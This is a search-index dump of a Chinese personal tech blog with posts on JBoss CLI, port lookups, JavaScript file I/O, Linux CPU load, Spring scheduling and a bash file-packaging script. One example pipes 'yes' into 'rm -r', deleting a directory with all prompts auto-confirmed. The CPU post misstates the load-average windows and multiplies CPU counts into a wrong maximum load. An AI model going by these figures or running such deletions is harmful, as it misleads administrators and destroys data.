jboss-ejb-in-ear.ear false true OK singleton_in_war.war singleton_in_war.war true true OK 其中的 PERSISTENT 並沒查到是什麼意思 目前猜測是重啟 war 是不是存在 因為 deployment 重啟 war 檔案會重新 load 檔案樣子? ","date":"2020-09-29","objectID":"/blog/posts/JBoss-%E4%BD%88%E7%BD%B2%E7%A8%8B%E5%BC%8F%E5%92%8C-cli-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/:4:0","tags":["jboss"],"title":"JBoss 部署程式和 cli 操作小記","uri":"/blog/posts/JBoss-%E4%BD%88%E7%BD%B2%E7%A8%8B%E5%BC%8F%E5%92%8C-cli-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"嘗試過指令 查詢目前啟動 war 狀況 /deployment=*:read-attribute(name=name) 這個超像 war XPath 查詢 參考: command line interface - JBoss 7 CLI to query all the deployed applications - Stack Overflow ","date":"2020-09-29","objectID":"/blog/posts/JBoss-%E4%BD%88%E7%BD%B2%E7%A8%8B%E5%BC%8F%E5%92%8C-cli-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/:4:1","tags":["jboss"],"title":"JBoss 部署程式和 cli 操作小記","uri":"/blog/posts/JBoss-%E4%BD%88%E7%BD%B2%E7%A8%8B%E5%BC%8F%E5%92%8C-cli-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"其他相關指令連結 Jboss 四種部署方法以及探討 - IT閱讀 jboss CLI 命令行接口学习（适用JBOSS EAP 6.2+） - 菩提树下的杨过 - 博客园 詳細 Jboss热部署–jboss-cli.sh指令方式_A HUGE FATTY-CSDN博客 詳細 JEAP 6 - cli 筆記 [JBoss] JBoss Deploy 讀取資料夾方式, Deploy exploded archives JBoss EAP 6 @ 瑞先生 :: 痞客邦 :: dodeploy command line interface - JBoss 7 CLI to query all the deployed applications - Stack Overflow CLI command to check deployment status in JBoss EAP - Red Hat Customer Portal ","date":"2020-09-29","objectID":"/blog/posts/JBoss-%E4%BD%88%E7%BD%B2%E7%A8%8B%E5%BC%8F%E5%92%8C-cli-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/:4:2","tags":["jboss"],"title":"JBoss 部署程式和 cli 操作小記","uri":"/blog/posts/JBoss-%E4%BD%88%E7%BD%B2%E7%A8%8B%E5%BC%8F%E5%92%8C-cli-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"OOM 【原创】一个线程oom，进程里其他线程还能运行吗？ - 孤独烟 - 博客园 线程和进程的区别是什么？ - 知乎 進程是資源分配的最小單位，線程是CPU調度的最小單位 彩蛋 从 NextCloud 替换为 Seafile | zwPapEr syncthing/syncthing: Open Source Continuous File Synchronization 抛弃nextcloud,开始搭建使用cozycloud 這網站有趣，切換出去會跑出 (=・ω・=) 页面崩溃啦 ~ 快回来看看~ 有空來研究怎麼搞出這個XD 我有時間寫的話，計畫要寫 seafile docker 實作 Clementine 音樂播放器 树莓派部署 seafile 和 nextcloud 比较 - 知乎 domenukk/seafile-docker-pi: A Docker image for Seafile server - Raspberry Pi Edition 2020-10-08 額外找的 Sharry：一个非常好用的文件分享程序-荒岛 ResilioSync：公私兼备的同步盘-荒岛 使用Syncthing自建私有同步盘-荒岛 CozyCloud：基于GO语言开发的网盘/同步盘-荒岛 Dropit：一个简洁的文件上传工具-荒岛 开源的私有云网盘程序Seafile安装教程-荒岛 ","date":"2020-09-29","objectID":"/blog/posts/JBoss-%E4%BD%88%E7%BD%B2%E7%A8%8B%E5%BC%8F%E5%92%8C-cli-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/:5:0","tags":["jboss"],"title":"JBoss 部署程式和 cli 操作小記","uri":"/blog/posts/JBoss-%E4%BD%88%E7%BD%B2%E7%A8%8B%E5%BC%8F%E5%92%8C-cli-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"linux如何查看端口被哪个进程占用 - 与f - 博客园 最近看到這篇實用 筆記 本文介紹linux如何查看端口被哪個進程佔用的方法： 1、lsof -i:端口號 2、netstat -tunlp|grep 端口號 都可以查看指定端口被哪個進程佔用的情況 【步驟一】lsof -i lsof -i 用以顯示符合條件的進程情況，lsof(list open files)是一個列出當前系統打開文件的工具。以root用戶來執行lsof -i命令，如下圖 【步驟二】lsof -i:端口號 lsof -i:端口號，用於查看某一端口的佔用情況，比如查看22號端口使用情況，lsof -i:22，如下圖 【步驟三】netstat -tunlp netstat -tunlp用於顯示tcp，udp的端口和進程等相關情況，如下圖 【步驟四】netstat -tunlp|grep 端口號 netstat -tunlp|grep 端口號，用於查看指定端口號的進程情況，如查看22端口的情況，netstat -tunlp|grep 22，如下圖 轉: https://jingyan.baidu.com/article/546ae1853947b71149f28cb7.html ","date":"2020-09-28","objectID":"/blog/posts/Linux-%E6%9F%A5%E7%9C%8B%E7%A8%8B%E5%BC%8F%E7%94%A8%E5%93%AA%E4%BA%9B-port-%E6%96%B9%E6%B3%95/:0:0","tags":["linux"],"title":"[轉]Linux 查看程式用哪些 port 方法","uri":"/blog/posts/Linux-%E6%9F%A5%E7%9C%8B%E7%A8%8B%E5%BC%8F%E7%94%A8%E5%93%AA%E4%BA%9B-port-%E6%96%B9%E6%B3%95/"},{"categories":["JavaScript"],"content":"最近簡單做了一個 web 文字模板 其實就是簡單正規化去取代 之前也有寫個類似東西 但是都要大幅度去改東西 不是很方便 但這次主要是紀錄 js 讀/寫 txt方法 ","date":"2020-09-26","objectID":"/blog/posts/Web-%E7%94%A8-JavaScript-%E8%AE%80-TXT-%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/:0:0","tags":["javascript","web","text"],"title":"Web 用 JavaScript 讀 TXT 檔案方法","uri":"/blog/posts/Web-%E7%94%A8-JavaScript-%E8%AE%80-TXT-%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/"},{"categories":["JavaScript"],"content":"讀 網路上忘記從哪邊參考過來的 其實我loadFile this抓不到原因是我呼叫方式 事後才想到 function loadFile(file) { var fr=new FileReader(); var that = file; fr.onload=function(){ console.log(fr.result); // $(that).prev().val(fr.result); // chgData(); }; fr.readAsText(file.files[0]); }; ","date":"2020-09-26","objectID":"/blog/posts/Web-%E7%94%A8-JavaScript-%E8%AE%80-TXT-%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/:1:0","tags":["javascript","web","text"],"title":"Web 用 JavaScript 讀 TXT 檔案方法","uri":"/blog/posts/Web-%E7%94%A8-JavaScript-%E8%AE%80-TXT-%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/"},{"categories":["JavaScript"],"content":"寫 我採用第一個 我的程式學習心得: 【Javascript】匯出txt function saveTextAsFile( _fileName, _text ) { var textFileAsBlob = new Blob([_text], {type:'text/plain'}); var downloadLink = document.createElement(\"a\"); downloadLink.download = _fileName; downloadLink.innerHTML = \"Download File\"; if (window.webkitURL != null) { // Chrome allows the link to be clicked // without actually adding it to the DOM. downloadLink.href = window.webkitURL.createObjectURL(textFileAsBlob); } else { // Firefox requires the link to be added to the DOM // before it can be clicked. downloadLink.href = window.URL.createObjectURL(textFileAsBlob); downloadLink.onclick = destroyClickedElement; downloadLink.style.display = \"none\"; document.body.appendChild(downloadLink); } downloadLink.click(); } function destroyClickedElement(event) { document.body.removeChild(event.target); } html - Javascript:: export to text file - Stack Overflow var saveData = (function () { var a = document.createElement(\"a\"); document.body.appendChild(a); a.style = \"display: none\"; return function (data, fileName) { var json = JSON.stringify(data), blob = new Blob([json], {type: \"octet/stream\"}), url = window.URL.createObjectURL(blob); a.href = url; a.download = fileName; a.click(); window.URL.revokeObjectURL(url); }; }()); 另類寫法 Download text file javascript - JSFiddle - Code Playground \u003ca href=\"data:text/plain;charset=UTF-8,Hello%20World!\" download=\"hello.txt\"\u003eDownload (static)\u003c/a\u003e \u003ca id=\"programatically\" href=\"\" download=\"date.txt\"\u003eDownload (dynamic)\u003c/a\u003e $(\"a#programatically\").click(function(){ var now = new Date().toString(); this.href = \"data:text/plain;charset=UTF-8,\" + encodeURIComponent(now); }); ","date":"2020-09-26","objectID":"/blog/posts/Web-%E7%94%A8-JavaScript-%E8%AE%80-TXT-%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/:2:0","tags":["javascript","web","text"],"title":"Web 用 JavaScript 讀 TXT 檔案方法","uri":"/blog/posts/Web-%E7%94%A8-JavaScript-%E8%AE%80-TXT-%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/"},{"categories":["JavaScript"],"content":"文件模板 其實之前就有想做文件模板 但一直都沒有什麼很好想法 最近突然想用 js-yaml 當作設定 簡單寫的爛code範例 JS Bin - Collaborative JavaScript Debugging jsbin 裡面存檔沒法運作，需要額外寫出來 可以直接用這個連結使用簡單功能連結 不過未來可規劃 加入 markdown-it 編輯可加入動態參數 editable 進階可加入Template7來做動態部分? 動態編輯輸入欄位(input date datetime-local …等等) 桌面板快速切換工作區? 但有空了解一些 js 方法 之後再實作看看 想想這些現在實力要花很多功力 所以先做個簡單版快速使用 ","date":"2020-09-26","objectID":"/blog/posts/Web-%E7%94%A8-JavaScript-%E8%AE%80-TXT-%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/:3:0","tags":["javascript","web","text"],"title":"Web 用 JavaScript 讀 TXT 檔案方法","uri":"/blog/posts/Web-%E7%94%A8-JavaScript-%E8%AE%80-TXT-%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"最近看到認識CPU | 沉迷思考的魚 就好奇怎麼看CPU不夠力 最後來整理一下 相關 CPU文章 認識CPU | 沉迷思考的魚 理解Linux系統負荷 - 阮一峰的網絡日誌 CPU的load和使用率傻傻分不清 - 昀溪 - 博客園 ","date":"2020-09-24","objectID":"/blog/posts/Linux-%E6%80%8E%E9%BA%BC%E7%9C%8B-CPU-%E4%B8%8D%E5%A4%A0%E7%94%A8/:0:0","tags":["linux","cpu"],"title":"Linux 怎麼看 CPU 不夠用","uri":"/blog/posts/Linux-%E6%80%8E%E9%BA%BC%E7%9C%8B-CPU-%E4%B8%8D%E5%A4%A0%E7%94%A8/"},{"categories":["Linux"],"content":"查詢 CPU 核心和線程 Linux # 查看 cpu 型號 sudo dmidecode -s processor-version # 查看 cpu 個數 grep 'physical id' /proc/cpuinfo | sort -u | wc -l # 查看核心數 grep 'core id' /proc/cpuinfo | sort -u | wc -l # 查看線程數 grep 'processor' /proc/cpuinfo | sort -u | wc -l Mac # 查看核心數 sysctl hw.physicalcpu # 查看線程數 sysctl hw.logicalcpu ","date":"2020-09-24","objectID":"/blog/posts/Linux-%E6%80%8E%E9%BA%BC%E7%9C%8B-CPU-%E4%B8%8D%E5%A4%A0%E7%94%A8/:1:0","tags":["linux","cpu"],"title":"Linux 怎麼看 CPU 不夠用","uri":"/blog/posts/Linux-%E6%80%8E%E9%BA%BC%E7%9C%8B-CPU-%E4%B8%8D%E5%A4%A0%E7%94%A8/"},{"categories":["Linux"],"content":"系統負荷怎麼看 系統負荷簡單就能看 CPU 能不能夠用 top uptime 都可以看到 load average: 0.09, 0.04, 0.00 這邊注意有三個數字，相當 5分鐘, 10 分鐘 ,15 分鐘系統負載 我們通常注意最後一個數字(15分鐘的) 怎樣數字能判斷? 系統負荷的經驗法則 1.0是系統負荷的理想值嗎？ 不一定，系統管理員往往會留一點餘地，當這個值達到0.7，就應當引起注意了。經驗法則是這樣的： 當系統負荷持續大於0.7，你必須開始調查了，問題出在哪裡，防止情況惡化。 當系統負荷持續大於1.0，你必須動手尋找解決辦法，把這個值降下來。 當系統負荷達到5.0，就表明你的系統有很嚴重的問題，長時間沒有響應，或者接近死機了。你不應該讓系統達到這個值。 參考: 認識CPU | 沉迷思考的魚 這邊要注意，這邊 1 全部是單指單核心、單一進程 下面會講一下多線程 ","date":"2020-09-24","objectID":"/blog/posts/Linux-%E6%80%8E%E9%BA%BC%E7%9C%8B-CPU-%E4%B8%8D%E5%A4%A0%E7%94%A8/:2:0","tags":["linux","cpu"],"title":"Linux 怎麼看 CPU 不夠用","uri":"/blog/posts/Linux-%E6%80%8E%E9%BA%BC%E7%9C%8B-CPU-%E4%B8%8D%E5%A4%A0%E7%94%A8/"},{"categories":["Linux"],"content":"多核心怎麼看系統負荷夠用? 總核數 = 物理CPU個數 * 每個物理CPU的核心數 總邏輯CPU數 = 物理CPU個數 * 每個物理CPU的核心數 * 超線程數量 參考CPU的load和使用率傻傻分不清 - 昀溪 - 博客園 簡單來看把最上面三個指令執行一下相乘後，就可以看到系統負載最大值 # 查看 cpu 個數 grep 'physical id' /proc/cpuinfo | sort -u | wc -l 2 # 查看核心數 grep 'core id' /proc/cpuinfo | sort -u | wc -l 4 # 查看線程數 grep 'processor' /proc/cpuinfo | sort -u | wc -l 6 這邊相乘就是 48 PS: 所以在多核心 Linux 下的 CPU 使用率超過 100% 是正常的 ","date":"2020-09-24","objectID":"/blog/posts/Linux-%E6%80%8E%E9%BA%BC%E7%9C%8B-CPU-%E4%B8%8D%E5%A4%A0%E7%94%A8/:3:0","tags":["linux","cpu"],"title":"Linux 怎麼看 CPU 不夠用","uri":"/blog/posts/Linux-%E6%80%8E%E9%BA%BC%E7%9C%8B-CPU-%E4%B8%8D%E5%A4%A0%E7%94%A8/"},{"categories":["Linux"],"content":"實際觀察 我目前某一個排程主機 Jenkins 上板會把所有排程打開，這樣會有一個嚴重問題，當下記憶體、CPU 過重 需要人工去開啟未成功排程 最近看了這篇文章 top 指令當下是 這邊也有看到文章說 5分鐘系統負載持續飆高 後面 10,15 分鐘的系統將會持續飆高 所以系統負載會不會好轉，可以從這邊看出來 然後在系統負載小於 48 時候，我在 2x 開啟排程都能順利執行 ","date":"2020-09-24","objectID":"/blog/posts/Linux-%E6%80%8E%E9%BA%BC%E7%9C%8B-CPU-%E4%B8%8D%E5%A4%A0%E7%94%A8/:4:0","tags":["linux","cpu"],"title":"Linux 怎麼看 CPU 不夠用","uri":"/blog/posts/Linux-%E6%80%8E%E9%BA%BC%E7%9C%8B-CPU-%E4%B8%8D%E5%A4%A0%E7%94%A8/"},{"categories":["Linux"],"content":"番外篇 記憶體怎麼看 之前我在玩樹莓派開很久會發現我 RAM 怎麼沒有降下去 後來看鳥哥文章看到 Linux RAM 不會馬上釋放掉 之後有看到文章說 swap 吃太多的時候，就要考慮到是不是記憶體不足? 有想到再補 手動清除 Linux 記憶體快取. /proc/sys/vm/drop_caches | by Yu-Hsin Hung | Hungys.blog() | Medium 尋找當下 Linux OS 效能瓶頸 - Phil Workspace ","date":"2020-09-24","objectID":"/blog/posts/Linux-%E6%80%8E%E9%BA%BC%E7%9C%8B-CPU-%E4%B8%8D%E5%A4%A0%E7%94%A8/:5:0","tags":["linux","cpu"],"title":"Linux 怎麼看 CPU 不夠用","uri":"/blog/posts/Linux-%E6%80%8E%E9%BA%BC%E7%9C%8B-CPU-%E4%B8%8D%E5%A4%A0%E7%94%A8/"},{"categories":["Java"],"content":"最近看到 Spring Boot TaskScheduler 簡單的範例 就簡單實作 沒想到這麼簡單 ","date":"2020-09-14","objectID":"/blog/posts/Spring-Boot-TaskScheduler-%E7%B0%A1%E5%96%AE%E5%AF%A6%E4%BD%9C%E8%B5%B7%E6%89%8B%E5%8B%A2/:0:0","tags":["spring","taskscheduler"],"title":"Spring Boot TaskScheduler 簡單實作起手勢","uri":"/blog/posts/Spring-Boot-TaskScheduler-%E7%B0%A1%E5%96%AE%E5%AF%A6%E4%BD%9C%E8%B5%B7%E6%89%8B%E5%8B%A2/"},{"categories":["Java"],"content":"簡單實作 @EnableScheduling 在 @SpringBootApplication 下面配置 @EnableScheduling 配置 Task 類別 @Component public class ScheduledTask { private static final SimpleDateFormat dateFormat = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\"); private Integer count0 = 1; private Integer count1 = 1; private Integer count2 = 1; @Scheduled(fixedRate = 5000) public void reportCurrentTime() throws InterruptedException { System.out.println(String.format(\"---第%s次執行，當前時間為：%s\", count0++, dateFormat.format(new Date()))); } @Scheduled(fixedDelay = 5000) public void reportCurrentTimeAfterSleep() throws InterruptedException { System.out.println(String.format(\"===第%s次執行，當前時間為：%s\", count1++, dateFormat.format(new Date()))); } @Scheduled(cron = \"0 0 1 * * *\") public void reportCurrentTimeCron() throws InterruptedException { System.out.println(String.format(\"+++第%s次執行，當前時間為：%s\", count2++, dateFormat.format(new Date()))); } } 參考: 基於Spring Boot 實現定時任務-springboot,java,spring 相關文章-天碼營 這邊有趣的是 cron 這邊有到秒 然後這邊程式是用單線程 所以前一個超過時間就不會執行(我看到文章是這樣寫) 這邊就不敘述，因為我也不是很懂 ","date":"2020-09-14","objectID":"/blog/posts/Spring-Boot-TaskScheduler-%E7%B0%A1%E5%96%AE%E5%AF%A6%E4%BD%9C%E8%B5%B7%E6%89%8B%E5%8B%A2/:1:0","tags":["spring","taskscheduler"],"title":"Spring Boot TaskScheduler 簡單實作起手勢","uri":"/blog/posts/Spring-Boot-TaskScheduler-%E7%B0%A1%E5%96%AE%E5%AF%A6%E4%BD%9C%E8%B5%B7%E6%89%8B%E5%8B%A2/"},{"categories":["Java"],"content":"相關文章 27. Task Execution and Scheduling 【小家Spring】Spring任务调度@Scheduled的使用以及原理、源码分析（@EnableScheduling）_YourBatman-CSDN博客 Spring Scheduler的使用与坑 | 懒程序员改变世界 SpringBoot中使用任务调度器的注意事项 Spring Schedule Tutorial · Burak Aktas How to Schedule Tasks with Spring Boot | CalliCoder java - Spring Boot Shutdown with Scheduler - Stack Overflow 基於Spring Boot 實現定時任務-springboot,java,spring 相關文章-天碼營 分布式任务调度平台XXL-JOB 在Spring Boot中优雅的实现定时任务 - 知乎 数据批处理神器-Spring Batch(1)简介及使用场景 | mason’s blog 动态改变Spring定时任务执行频率-阿里云开发者社区 Springboot定时任务踩坑记录 - 技术杂谈 - SegmentFault 思否 Shutdown a Spring Boot Application | Baeldung Spring Batch 跟 Spring Boot Task 是不一樣東西… ","date":"2020-09-14","objectID":"/blog/posts/Spring-Boot-TaskScheduler-%E7%B0%A1%E5%96%AE%E5%AF%A6%E4%BD%9C%E8%B5%B7%E6%89%8B%E5%8B%A2/:2:0","tags":["spring","taskscheduler"],"title":"Spring Boot TaskScheduler 簡單實作起手勢","uri":"/blog/posts/Spring-Boot-TaskScheduler-%E7%B0%A1%E5%96%AE%E5%AF%A6%E4%BD%9C%E8%B5%B7%E6%89%8B%E5%8B%A2/"},{"categories":["Java"],"content":"問題 我在想程是執行中那要怎麼關閉程式呢? 我想改一個方法就要把所有程式關掉 這樣執行中程式不是就會有問題 不過，也有可能 Spring Boot Task 應該只要放一個任務工作程式就沒這個問題? 但實務上是不是這樣做就不知道了 ","date":"2020-09-14","objectID":"/blog/posts/Spring-Boot-TaskScheduler-%E7%B0%A1%E5%96%AE%E5%AF%A6%E4%BD%9C%E8%B5%B7%E6%89%8B%E5%8B%A2/:3:0","tags":["spring","taskscheduler"],"title":"Spring Boot TaskScheduler 簡單實作起手勢","uri":"/blog/posts/Spring-Boot-TaskScheduler-%E7%B0%A1%E5%96%AE%E5%AF%A6%E4%BD%9C%E8%B5%B7%E6%89%8B%E5%8B%A2/"},{"categories":["Linux"],"content":"最近看到有趣小工具 有點像 Linux 自動化工具 這邊小記一下 ","date":"2020-09-13","objectID":"/blog/posts/expect-%E5%92%8C-yes-%E8%87%AA%E5%8B%95%E5%8C%96%E5%B7%A5%E5%85%B7/:0:0","tags":["expect",true],"title":"expect 和 yes 自動化工具","uri":"/blog/posts/expect-%E5%92%8C-yes-%E8%87%AA%E5%8B%95%E5%8C%96%E5%B7%A5%E5%85%B7/"},{"categories":["Linux"],"content":"yes utilities - What is the point of the yes command? - Unix \u0026 Linux Stack Exchange Linux yes Command Tutorial for Beginners (with Examples) yes | rm -r large_directory yes | fsck /dev/foo ","date":"2020-09-13","objectID":"/blog/posts/expect-%E5%92%8C-yes-%E8%87%AA%E5%8B%95%E5%8C%96%E5%B7%A5%E5%85%B7/:1:0","tags":["expect",true],"title":"expect 和 yes 自動化工具","uri":"/blog/posts/expect-%E5%92%8C-yes-%E8%87%AA%E5%8B%95%E5%8C%96%E5%B7%A5%E5%85%B7/"},{"categories":["Linux"],"content":"expect linux expect详解(ssh自动登录) - 懒惰的肥兔 - 博客园 也有查 window 能跑 expect 方法 Windows上安装配置SSH教程（5）——win10下使用Cygwin+Expect自动登陆ssh - feipeng8848 - 博客园 原本想簡單使用，但後來最近發太多文章 然後目前這個應該還用不太到 有用過再紀錄 不過自動化學習工具應該使用 Ansible 感覺會比較好 ","date":"2020-09-13","objectID":"/blog/posts/expect-%E5%92%8C-yes-%E8%87%AA%E5%8B%95%E5%8C%96%E5%B7%A5%E5%85%B7/:2:0","tags":["expect",true],"title":"expect 和 yes 自動化工具","uri":"/blog/posts/expect-%E5%92%8C-yes-%E8%87%AA%E5%8B%95%E5%8C%96%E5%B7%A5%E5%85%B7/"},{"categories":["Linux"],"content":"之前就有在查類似指令 但沒有覺得很快速方法 這邊先整理 ","date":"2020-09-11","objectID":"/blog/posts/Linux-cp-%E5%BF%AB%E9%80%9F%E6%96%B0%E5%A2%9E%E7%9B%AE%E7%9A%84%E4%B8%8D%E5%AD%98%E5%9C%A8%E8%B3%87%E6%96%99%E5%A4%BE%E6%96%B9%E6%B3%95/:0:0","tags":["linux","cp"],"title":"Linux cp 快速複製目的不存在資料夾方法","uri":"/blog/posts/Linux-cp-%E5%BF%AB%E9%80%9F%E6%96%B0%E5%A2%9E%E7%9B%AE%E7%9A%84%E4%B8%8D%E5%AD%98%E5%9C%A8%E8%B3%87%E6%96%99%E5%A4%BE%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"mac cp –parents 可用這個指令解決我需求問題 但我沒 mac QQ ","date":"2020-09-11","objectID":"/blog/posts/Linux-cp-%E5%BF%AB%E9%80%9F%E6%96%B0%E5%A2%9E%E7%9B%AE%E7%9A%84%E4%B8%8D%E5%AD%98%E5%9C%A8%E8%B3%87%E6%96%99%E5%A4%BE%E6%96%B9%E6%B3%95/:1:0","tags":["linux","cp"],"title":"Linux cp 快速複製目的不存在資料夾方法","uri":"/blog/posts/Linux-cp-%E5%BF%AB%E9%80%9F%E6%96%B0%E5%A2%9E%E7%9B%AE%E7%9A%84%E4%B8%8D%E5%AD%98%E5%9C%A8%E8%B3%87%E6%96%99%E5%A4%BE%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"mkdir -p 平常我快速建置資料夾 mkdir -p dirname /xxxx/xx/x/x/x/x/filename cp xxx /xxxx/xx/x/x/x/x/filename 但數量越多，這樣做也不會比較快 ","date":"2020-09-11","objectID":"/blog/posts/Linux-cp-%E5%BF%AB%E9%80%9F%E6%96%B0%E5%A2%9E%E7%9B%AE%E7%9A%84%E4%B8%8D%E5%AD%98%E5%9C%A8%E8%B3%87%E6%96%99%E5%A4%BE%E6%96%B9%E6%B3%95/:2:0","tags":["linux","cp"],"title":"Linux cp 快速複製目的不存在資料夾方法","uri":"/blog/posts/Linux-cp-%E5%BF%AB%E9%80%9F%E6%96%B0%E5%A2%9E%E7%9B%AE%E7%9A%84%E4%B8%8D%E5%AD%98%E5%9C%A8%E8%B3%87%E6%96%99%E5%A4%BE%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"cp-p SOURCE… DIRECTORY/ cp-p() { last=${@: -1} if [[ $# -ge 2 \u0026\u0026 \"$last\" == */ ]] ; then # cp SOURCE... DEST/ mkdir -p \"$last\" \u0026\u0026 cp \"$@\" else echo \"cp-p: (copy, creating parent dirs)\" echo \"cp-p: Usage: cp-p SOURCE... DEST/\" fi } 但這樣改從清單還要多一層處理目的資料夾 我覺得不是很實用 ","date":"2020-09-11","objectID":"/blog/posts/Linux-cp-%E5%BF%AB%E9%80%9F%E6%96%B0%E5%A2%9E%E7%9B%AE%E7%9A%84%E4%B8%8D%E5%AD%98%E5%9C%A8%E8%B3%87%E6%96%99%E5%A4%BE%E6%96%B9%E6%B3%95/:3:0","tags":["linux","cp"],"title":"Linux cp 快速複製目的不存在資料夾方法","uri":"/blog/posts/Linux-cp-%E5%BF%AB%E9%80%9F%E6%96%B0%E5%A2%9E%E7%9B%AE%E7%9A%84%E4%B8%8D%E5%AD%98%E5%9C%A8%E8%B3%87%E6%96%99%E5%A4%BE%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"install -D install -D test1.sh ./xxx/test.sh 但不確定什麼問題，沒選出最佳答案 ","date":"2020-09-11","objectID":"/blog/posts/Linux-cp-%E5%BF%AB%E9%80%9F%E6%96%B0%E5%A2%9E%E7%9B%AE%E7%9A%84%E4%B8%8D%E5%AD%98%E5%9C%A8%E8%B3%87%E6%96%99%E5%A4%BE%E6%96%B9%E6%B3%95/:4:0","tags":["linux","cp"],"title":"Linux cp 快速複製目的不存在資料夾方法","uri":"/blog/posts/Linux-cp-%E5%BF%AB%E9%80%9F%E6%96%B0%E5%A2%9E%E7%9B%AE%E7%9A%84%E4%B8%8D%E5%AD%98%E5%9C%A8%E8%B3%87%E6%96%99%E5%A4%BE%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"install 指定清單做複製方法 最近因為專案是用 SVN 但包檔要給客戶需要包成zip 這邊有時候從 SVN 去看目錄手動複製真的很麻煩 尤其還要對 class去做複製 今天寫了好用腳本 Windows 10 直接用 WSL 也可以操作 #!/bin/bash # 包版日期 DAYV=\"201113\" # 包版版本 VERSION=\"002\" # 有針對資料夾和檔案都可以做複製 # 萬用字玩也可以 # 找不檔案也不會有問題 SPATHLIST=( # #SHARE ./web/build/classes/aa ./web/build/classes/aa/ # BATCH ./TEST ./batch/src/com/abc/batch/Aaaaa.java ./batch/src/com/abc/batch/schedule/job/* # bin, class ./batch/bin/com/abc/batch/Aaaaa.class ) # install 資料夾複製方法參考 # https://unix.stackexchange.com/questions/165463/problem-with-install-command-to-copy-a-whole-directory DPATH=\"/CodePackage/${DAYV}/${VERSION}/${DAYV}_code_package\" length=${#SPATHLIST[@]} for(( j=0; j\u003c$length; j++ )) do if [[ ! -e \"${SPATHLIST[$j]}\" ]]; then # 檢查檔案 https://linuxize.com/post/bash-check-if-file-exists/ echo \"${SPATHLIST[$j]}找不到檔案檔案\" continue fi if [[ -d \"${SPATHLIST[$j]}\" ]]; then # 加入 exec 印出內容 # https://askubuntu.com/questions/651315/how-do-you-output-the-filename-in-find-command-while-using-exec find \"${SPATHLIST[$j]}\" -type f -printf '%p\\n' -exec install -D \"{}\" \"${DPATH}/{}\" \\; else install -D ${SPATHLIST[$j]} ${DPATH}/${SPATHLIST[$j]} fi echo \"${SPATHLIST[$j]} 成功搬移 ${DPATH}/${SPATHLIST[$j]}\" done cp ./copyfiles.sh ${DPATH}/../copyfiles${DAYV}${VERSION}.sh # 寫更版紀錄 txt TXT_FILE=\"更版紀錄_${DAYV}_${VERSION}.txt\" TXT_FILEPATH=${DPATH}/${TXT_FILE} echo \"\u003c${DAYV}_${VERSION}\u003e #\" \u003e ${TXT_FILEPATH} echo \"\" \u003e\u003e ${TXT_FILEPATH} echo \"Revision: \u003e\u003e\u003e\u003e\u003e\u003e (Beta${VERSION})\" \u003e\u003e ${TXT_FILEPATH} echo \"Author: xxx\" \u003e\u003e ${TXT_FILEPATH} echo \"Date: $(date +\"%Y年%m月%d日 %T\")\" \u003e\u003e ${TXT_FILEPATH} echo \"\" \u003e\u003e ${TXT_FILEPATH} echo \" #\u003e\u003e\u003e\u003e\u003e\u003e\" \u003e\u003e ${TXT_FILEPATH} echo \"\" \u003e\u003e ${TXT_FILEPATH} echo \"【問題說明】\" \u003e\u003e ${TXT_FILEPATH} echo \" \u003e\u003e\u003e\u003e\u003e\u003e\" \u003e\u003e ${TXT_FILEPATH} echo \"【處理說明】\" \u003e\u003e ${TXT_FILEPATH} echo \" \u003e\u003e\u003e\u003e\u003e\u003e\" \u003e\u003e ${TXT_FILEPATH} echo \" \" \u003e\u003e ${TXT_FILEPATH} echo \"\" \u003e\u003e ${TXT_FILEPATH} echo \"相關程式如下：\" \u003e\u003e ${TXT_FILEPATH} echo \"\" \u003e\u003e ${TXT_FILEPATH} for(( j=0; j\u003c$length; j++ )) do let INDEX=$j+1 echo \"${INDEX}.\" \"${SPATHLIST[$j]}\" \u003e\u003e ${TXT_FILEPATH} done # 產生 password txt(為了手動包 zip用的) # 因為客戶需要更版紀錄，我需要去 Mantis 複製內容再zip echo \"pwd20\"${DAYV} \u003e ${DPATH}/../password.txt 這樣半自動化，相信能減少很多出錯 ","date":"2020-09-11","objectID":"/blog/posts/Linux-cp-%E5%BF%AB%E9%80%9F%E6%96%B0%E5%A2%9E%E7%9B%AE%E7%9A%84%E4%B8%8D%E5%AD%98%E5%9C%A8%E8%B3%87%E6%96%99%E5%A4%BE%E6%96%B9%E6%B3%95/:4:1","tags":["linux","cp"],"title":"Linux cp 快速複製目的不存在資料夾方法","uri":"/blog/posts/Linux-cp-%E5%BF%AB%E9%80%9F%E6%96%B0%E5%A2%9E%E7%9B%AE%E7%9A%84%E4%B8%8D%E5%AD%98%E5%9C%A8%E8%B3%87%E6%96%99%E5%A4%BE%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"最近抓取一些專案 需要執行 mvn install 但是非常多專案 在想有什麼快速方法(雖然已經手動執行完了) 最近看到Linux 執行目錄下所有 Script可以解決我的需求 就嘗試看看 